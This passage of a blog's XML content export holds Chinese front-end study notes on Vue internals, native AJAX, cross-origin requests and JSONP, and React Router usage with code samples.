class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Compile</span>(<span class="params">el, vm</span>) &#123;</span><br><span class="line">  ... ...</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">replace</span>(<span class="params">fragment</span>) &#123;</span><br><span class="line">    <span class="title class_">Array</span>.<span class="title function_">from</span>(fragment.<span class="property">childNodes</span>).<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">node</span>) &#123;</span><br><span class="line">      ... ...</span><br><span class="line">      <span class="keyword">if</span> (node.<span class="property">nodeType</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> nodeAttrs = node.<span class="property">attributes</span>;</span><br><span class="line">        <span class="title class_">Array</span>.<span class="title function_">from</span>(nodeAttrs).<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">attr</span>) &#123;</span><br><span class="line">          <span class="keyword">let</span> name = attr.<span class="property">name</span>;</span><br><span class="line">          <span class="keyword">let</span> exp = attr.<span class="property">value</span>;</span><br><span class="line">          <span class="comment">// 默认以 &quot;v-&quot; 开头的为 &quot;v-model&quot;</span></span><br><span class="line">          <span class="keyword">if</span> (name.<span class="title function_">indexOf</span>(<span class="string">&#x27;v-&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            node.<span class="property">value</span> = vm[exp];</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">new</span> <span class="title class_">Watcher</span>(vm, exp, <span class="keyword">function</span> (<span class="params">newVal</span>) &#123;</span><br><span class="line">            node.<span class="property">value</span> = newVal;</span><br><span class="line">          &#125;)</span><br><span class="line">          node.<span class="title function_">addEventListener</span>(<span class="string">&#x27;input&#x27;</span>, <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> newVal = e.<span class="property">target</span>.<span class="property">value</span>;</span><br><span class="line">            vm[exp] = newVal;</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      ... ...</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="8-计算属性"><a href="#8-计算属性" class="headerlink" title="8. 计算属性"></a>8. 计算属性</h1><p>在Vue中，计算属性可以被缓存到vm实例上：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">initComputed</span>(<span class="params"></span>) &#123; <span class="comment">// 具有缓存功能</span></span><br><span class="line">  <span class="keyword">let</span> vm = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="keyword">let</span> computed = <span class="variable language_">this</span>.<span class="property">$options</span>.<span class="property">computed</span>;</span><br><span class="line">  <span class="comment">// Object.keys()方法可以将一个对象的key存放在一个数组数组中</span></span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">keys</span>(computed).<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">key</span>) &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(vm, key, &#123;</span><br><span class="line">      <span class="attr">get</span>: computed[key]</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
            <tag> 源码解析 </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>原生AJAX的使用</title>
      <link href="/2019/05/836f15dee62b.html"/>
      <url>/2019/05/836f15dee62b.html</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="1-XMLHttpRequest"><a href="#1-XMLHttpRequest" class="headerlink" title="1. XMLHttpRequest"></a>1. XMLHttpRequest</h2><h3 id="1-1-原生XMLHttpRequest的使用"><a href="#1-1-原生XMLHttpRequest的使用" class="headerlink" title="1.1 原生XMLHttpRequest的使用"></a>1.1 原生XMLHttpRequest的使用</h3><p><code>xhr.opne([Method], [url], [bollen])</code> 创建一个连接，第一个参数为请求的方法，如 GET、POST；第二个参数为请求的 url 地址；第三个参数为一个布尔值，代表是否以同步(Sync)方式加载，默认为false(异步Asyn方式加载)</p><p><code>xhr.onreadystatechange</code> xhr 对象状态改变后触发的函数事件</p><p><code>xhr.readyState</code> xhr 对象当前的状态</p><p><code>xhr.status</code> 获取发送数据返回的状态码</p><p><code>xhr.responseText</code> 返回的数据</p><p><code>xhr.send()</code> 发送的数据，如果仅仅发送一个请求而不传送数据则传入参数为 null</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/api&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(xhr.<span class="property">readyState</span> == <span class="number">4</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(xhr.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(xhr.<span class="property">responseText</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhr.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><h3 id="1-2-兼容性问题"><a href="#1-2-兼容性问题" class="headerlink" title="1.2 兼容性问题"></a>1.2 兼容性问题</h3><ul><li>IE低版本使用ActiveXObject，和W3C标准不一样</li><li>IE低版本使用量以非常少，很多网站都早已不支持</li><li>建议对E低版本的兼容性：了解即可，无需深究</li><li>如果遇到对I正低版本要求苛刻的面试，果断放弃</li></ul><h2 id="2-状态码"><a href="#2-状态码" class="headerlink" title="2. 状态码"></a>2. 状态码</h2><h3 id="2-1-readyState的状态码"><a href="#2-1-readyState的状态码" class="headerlink" title="2.1 readyState的状态码"></a>2.1 readyState的状态码</h3><ul><li>0 -（未初始化）还没有调用send0方法</li><li>1 -（载入）已调用send）方法，正在发送请求</li><li>2 -（载入完成）send）方法执行完成，已经接收到全部响应内容</li><li>3 -（交互）正在解析响应内容</li><li>4 -（完成）响应内容解析完成，可以在客户端调用了【常用】</li></ul><h2 id="2-2-state网络状态码"><a href="#2-2-state网络状态码" class="headerlink" title="2.2 state网络状态码"></a>2.2 state网络状态码</h2><ul><li>2xx-表示成功处理请求。如200</li><li>3xx-需要重定向，浏览器直接跳转</li><li>4xx-客户端请求错误，如404</li><li>5xx-服务器端错误</li></ul><h2 id="3-跨域"><a href="#3-跨域" class="headerlink" title="3. 跨域"></a>3. 跨域</h2><h3 id="3-1-什么是跨域"><a href="#3-1-什么是跨域" class="headerlink" title="3.1 什么是跨域"></a>3.1 什么是跨域</h3><p>浏览器有同源策略，不允许ajax访问其他域接口</p><p>跨域条件：协议、域名、端口（HTTP默认端口是80，HTTPS默认端口是443），有一个不同就算跨域</p><p>允许跨域的三个标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">xxx</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">xxxx</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">xxx</span>&gt;</span></span><br></pre></td></tr></table></figure><p>三个标签的应用场景：</p><ul><li><code>&lt;img&gt;</code> 用于打点统计，统计网站可能是其他域</li><li><code>&lt;link&gt;&lt;script&gt;</code> 可以使用CDN，CDN的也是其他域</li><li><code>&lt;script&gt;</code> 可以用于JSONP</li></ul><p>跨域注意事项：</p><ul><li>所有的跨域请求都必须经过信息提供方允许</li><li>如果未经允许即可获取，那是浏览器同源策略出现漏洞</li></ul><h3 id="3-2-JSONP"><a href="#3-2-JSONP" class="headerlink" title="3.2 JSONP"></a>3.2 JSONP</h3><p>原理：</p><p><code>&lt;script&gt;</code> 标签允许跨域。</p><p>步骤：</p><p>（1）在页面的主Javascript文件中去定义一个方法作为处理JSONP数据的函数，这个方法必须挂载在window上或者是在全局定义的，方法的某一参数为规定为<code>data</code>，用来接收以JSONP方法传入的数据，在方法内部设置与<code>data</code>相关的操作。</p><p>（2）从外部引入一个 <code>&lt;script&gt;</code> 标签，引入的script的内容中只有一个立即执行的方法，方法的名称即为第一步设定的方法名，方法的参数位<code>data</code>，传入相应的数据。</p><p><img src="http://markdown.img.esunr.xyz/a71efaafly1g2j93agwwyj20i505zaad.jpg" alt=""></p><h3 id="3-3-服务器端设置-http-header，"><a href="#3-3-服务器端设置-http-header，" class="headerlink" title="3.3 服务器端设置 http header，"></a>3.3 服务器端设置 http header，</h3><p><img src="http://markdown.img.esunr.xyz/20190507112512.png" alt=""></p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="1-手动编写一个ajax，不依赖第三方库"><a href="#1-手动编写一个ajax，不依赖第三方库" class="headerlink" title="1. 手动编写一个ajax，不依赖第三方库"></a>1. 手动编写一个ajax，不依赖第三方库</h2><h2 id="2-跨域的几种实现方式"><a href="#2-跨域的几种实现方式" class="headerlink" title="2. 跨域的几种实现方式"></a>2. 跨域的几种实现方式</h2>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React学习笔记06：项目实战（二）</title>
      <link href="/2019/05/dd2c0de0f7c8.html"/>
      <url>/2019/05/dd2c0de0f7c8.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/EsunR/React-Study/tree/master/08-%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98%EF%BC%9A%E9%A6%96%E9%A1%B5%E5%BC%80%E5%8F%91">Github源码</a></p><h1 id="1-在React项目中使用路由功能"><a href="#1-在React项目中使用路由功能" class="headerlink" title="1. 在React项目中使用路由功能"></a>1. 在React项目中使用路由功能</h1><h2 id="1-1-基本使用方法"><a href="#1-1-基本使用方法" class="headerlink" title="1.1 基本使用方法"></a>1.1 基本使用方法</h2><p>首先下载 <code>react-router-dom</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add react-router-dom</span><br></pre></td></tr></table></figure><p>在主文件 <code>App.js</code> 中引入 <code>BrowserRouter</code> ， <code>Route</code> 组件，然后在JSX的VDOM树中直接插入路由</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; <span class="title class_">Component</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line">... ...</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">BrowserRouter</span>, <span class="title class_">Route</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span> </span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Header</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">        ... ...</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">BrowserRouter</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&#x27;/&#x27;</span> <span class="attr">exact</span> <span class="attr">render</span>=<span class="string">&#123;()</span> =&gt;</span> <span class="tag">&lt;<span class="name">div</span>&gt;</span>home<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&#125;&gt;<span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&#x27;/detail&#x27;</span> <span class="attr">exact</span> <span class="attr">render</span>=<span class="string">&#123;()</span> =&gt;</span> <span class="tag">&lt;<span class="name">div</span>&gt;</span>detail<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&#125;&gt;<span class="tag">&lt;/<span class="name">Route</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">BrowserRouter</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure><p><img src="http://img.cdn.esunr.xyz/markdown/20190522203023.png" alt=""></p><p><img src="http://img.cdn.esunr.xyz/markdown/20190522203104.png" alt=""></p><p>需要注意的几点：</p><ul><li>普通组件与路由组件需要包裹在同一个div中</li><li><code>&lt;BrowserRouter&gt;&lt;/BrowserRouter&gt;</code> 内部需要由一个div包裹</li><li><code>path</code> 为路由组件的路由属性</li><li><code>exact</code> 表示当完全符合 <code>path</code> 的路径时，只渲染当前 <code>&lt;Route&gt;&lt;/Route&gt;</code> 标签。如果不添加 <code>exact</code>，那么按照上面的例子，访问 <code>/detail</code> 时，<code>&lt;Route path=&#39;/&#39; exact render=&#123;() =&gt; &lt;div&gt;home&lt;/div&gt;&#125;&gt;&lt;/Route&gt;</code> 也会被渲染</li></ul><h2 id="1-2-将Route渲染的组件抽离为单个页面文件"><a href="#1-2-将Route渲染的组件抽离为单个页面文件" class="headerlink" title="1.2 将Route渲染的组件抽离为单个页面文件"></a>1.2 将Route渲染的组件抽离为单个页面文件</h2><p>如果想单独把页面抽离为组件，利用 <code>Route</code> 导入组件，就将 <code>Route</code> 标签下的 <code>render</code> 改为 <code>component</code> ，其值为引入的组件，如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">新增目录：</span><br><span class="line">src</span><br><span class="line">|- pages</span><br><span class="line">|  |- detail</span><br><span class="line">|  |  |- index.js</span><br><span class="line">|  |- home</span><br><span class="line">|  |  |- index.js</span><br><span class="line">+++++++++++++++++</span><br></pre></td></tr></table></figure><p>将主页面文件 <code>App.js</code> 改为：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  import React, &#123; Component &#125; from &#x27;react&#x27;</span><br><span class="line">  import Header from &#x27;./common/header&#x27;</span><br><span class="line">  ... ...</span><br><span class="line">  import &#123; BrowserRouter, Route &#125; from &#x27;react-router-dom&#x27;</span><br><span class="line"><span class="addition">+ import Home from &#x27;./pages/home&#x27;;</span></span><br><span class="line"><span class="addition">+ import Detail from &#x27;./pages/detail&#x27;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  class App extends Component &#123;</span><br><span class="line">    render() &#123;</span><br><span class="line">      return (</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">          &lt;Header&gt;&lt;/Header&gt;</span><br><span class="line">          &lt;BrowserRouter&gt;</span><br><span class="line">            &lt;div&gt;</span><br><span class="line"><span class="deletion">-             &lt;Route path=&#x27;/&#x27; exact render=&#123;() =&gt; &lt;div&gt;home&lt;/div&gt;&#125;&gt;&lt;/Route&gt;</span></span><br><span class="line"><span class="addition">+             &lt;Route path=&#x27;/&#x27; exact component=&#123;Home&#125;&gt;&lt;/Route&gt;</span></span><br><span class="line"><span class="deletion">-             &lt;Route path=&#x27;/detail&#x27; exact render=&#123;() =&gt; &lt;div&gt;detail&lt;/div&gt;&#125;&gt;&lt;/Route&gt;</span></span><br><span class="line"><span class="addition">+             &lt;Route path=&#x27;/detail&#x27; exact component=&#123;Detail&#125;&gt;&lt;/Route&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">          &lt;/BrowserRouter&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  export default App;</span><br></pre></td></tr></table></figure><h2 id="1-3-在组件中进行页面跳转"><a href="#1-3-在组件中进行页面跳转" class="headerlink" title="1.3 在组件中进行页面跳转"></a>1.3 在组件中进行页面跳转</h2><p>使用 react-router-dom 中的 Link 组件可以实现页面的跳转</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Link</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span></span><br><span class="line">... ...</span><br><span class="line"><span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">Link</span> <span class="attr">to</span>=<span class="string">&quot;detail&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Link</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure><h2 id="1-4-在路由中传入参数"><a href="#1-4-在路由中传入参数" class="headerlink" title="1.4 在路由中传入参数"></a>1.4 在路由中传入参数</h2><h3 id="1-4-1-params动态路由"><a href="#1-4-1-params动态路由" class="headerlink" title="1.4.1 params动态路由"></a>1.4.1 params动态路由</h3><p>在简书项目中，通过对路由传入不同的参数来跳转到不同的文章界面，如查看文章id为1的文章，其路由地址为 <code>/detail/1</code>。</p><p>在 <code>&lt;Router&gt;</code> 标签中为其设置路由接收的参数：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  // App.js</span><br><span class="line">  ... ...</span><br><span class="line">  render() &#123;</span><br><span class="line">    return (</span><br><span class="line">      ... ...</span><br><span class="line">      &lt;BrowserRouter&gt;</span><br><span class="line"><span class="addition">+         &lt;Route path=&#x27;/detail/:id&#x27; exact component=&#123;Detail&#125;&gt;&lt;/Route&gt;</span></span><br><span class="line">      &lt;/BrowserRouter&gt;</span><br><span class="line">      ... ...</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">  ... ...</span><br></pre></td></tr></table></figure><p>获取当前路由的参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">match</span>.<span class="property">params</span></span><br></pre></td></tr></table></figure><h3 id="1-4-2-query参数路由"><a href="#1-4-2-query参数路由" class="headerlink" title="1.4.2 query参数路由"></a>1.4.2 query参数路由</h3><p>在简书项目中，通过对路由传入不同的参数来跳转到不同的文章界面，如查看文章id为1的文章，其路由地址为 <code>/detail?id=1</code>。</p><p>获取参数路由：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">location</span>.<span class="property">search</span> <span class="comment">// search:&quot;?id=1&quot;</span></span><br></pre></td></tr></table></figure><p>我们再 <code>String</code> 上挂载一个方法手动解析字符串：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">String</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">parseQuery</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> queryStr = <span class="variable language_">this</span>.<span class="title function_">split</span>(<span class="string">&quot;?&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">var</span> queryArr = queryStr.<span class="title function_">split</span>(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">  <span class="keyword">var</span> queryObj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> queryArr) &#123;</span><br><span class="line">    <span class="keyword">var</span> queryItem = queryArr[i].<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">    queryObj[queryItem[<span class="number">0</span>]] = queryItem[<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> queryObj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&quot;www.baidu.com/search?id=1&amp;content=hahahahah&amp;time=2019524&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(url.<span class="title function_">parseQuery</span>());</span><br></pre></td></tr></table></figure><h2 id="1-5-使用-lt-Redirect-gt-标签对页面重定向"><a href="#1-5-使用-lt-Redirect-gt-标签对页面重定向" class="headerlink" title="1.5 使用&lt;Redirect/&gt;标签对页面重定向"></a>1.5 使用<code>&lt;Redirect/&gt;</code>标签对页面重定向</h2><p>如果我们希望在进入页面时让页跳转到某一个路由地址，就在当前页面添加一个 <code>&lt;Redirect/&gt;</code> 标签，其包含一个 <code>to</code> 属性，属性值为希望跳转到的路由地址，如下示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Redirect</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span></span><br><span class="line">... ...</span><br><span class="line"><span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">Redirect</span> <span class="attr">to</span>=<span class="string">&quot;/&quot;</span> /&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure><h1 id="2-在Styled-components中使用组件Props传入的值"><a href="#2-在Styled-components中使用组件Props传入的值" class="headerlink" title="2. 在Styled-components中使用组件Props传入的值"></a>2. 在Styled-components中使用组件Props传入的值</h1><p>在某组件使用 Styled-components 处理样式时，可以在该组件上添加一个属性值，然后再其对应的 <code>style.js</code> 文件中，在编写其组件样式时就可以用 <code>$&#123; (props) =&gt; props.[propsKey] &#125;</code></p><p>如我们再开发简书项目时，右侧会有不同的板块图片，每个板块图片都是由一个 <code>RecommentItem</code> 组件渲染出的，但其每个组件的背景图片都不一样，如下：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190523144309.png" alt="20190523144309.png"></p><p>所以我们可以在 <code>RecommentItem</code> 组件中传入一个 <code>imgUrl</code> 的参数，来让该组件的CSS样式在渲染时，<code>background</code> 渲染出不同的 url 地址，具体做法如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- jsx --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">RecommentWrapper</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">RecommentItem</span> <span class="attr">imgUrl</span>=<span class="string">&quot;http://img.cdn.esunr.xyz/banner-s-club-aa8bdf19f8cf729a759da42e4a96f366.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">RecommentItem</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">RecommentItem</span> <span class="attr">imgUrl</span>=<span class="string">&quot;http://img.cdn.esunr.xyz/banner-s-7-1a0222c91694a1f38e610be4bf9669be.png&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">RecommentItem</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">RecommentWrapper</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// styled-component</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title class_">RecommentItem</span> = styled.<span class="property">div</span><span class="string">`</span></span><br><span class="line"><span class="string">  width: 280px;</span></span><br><span class="line"><span class="string">  height: 50px; </span></span><br><span class="line"><span class="string">  background: url(<span class="subst">$&#123;(props) =&gt; props.imgUrl&#125;</span>);</span></span><br><span class="line"><span class="string">  background-size: contain;</span></span><br><span class="line"><span class="string">  margin-bottom: 10px;</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure><h1 id="3-使用PureComponent来优化组件性能"><a href="#3-使用PureComponent来优化组件性能" class="headerlink" title="3. 使用PureComponent来优化组件性能"></a>3. 使用PureComponent来优化组件性能</h1><p>在简书项目中首页创建的所有组件几乎都使用了Connect方法来与Store进行了连接，那么只要数据发生了改变，那么每一个组件都会被重新渲染。这时候可以使用之前学到的 <code>shuoldComponentUpdate</code> 来判断改变的数据是否与当前组件相关，如果相关才会重新渲染，否则不渲染。</p><p>在React16中提供了一个新的方法，使用 <code>PureComponent</code> 来代替 <code>Component</code> 创建一个纯组件，使用 <code>PureComponent</code> 创建的组件将要被重新渲染时，会自动判断自己 <code>props</code> 中的数据是否发生了变动，如果发生了变动才会重新渲染自己。</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 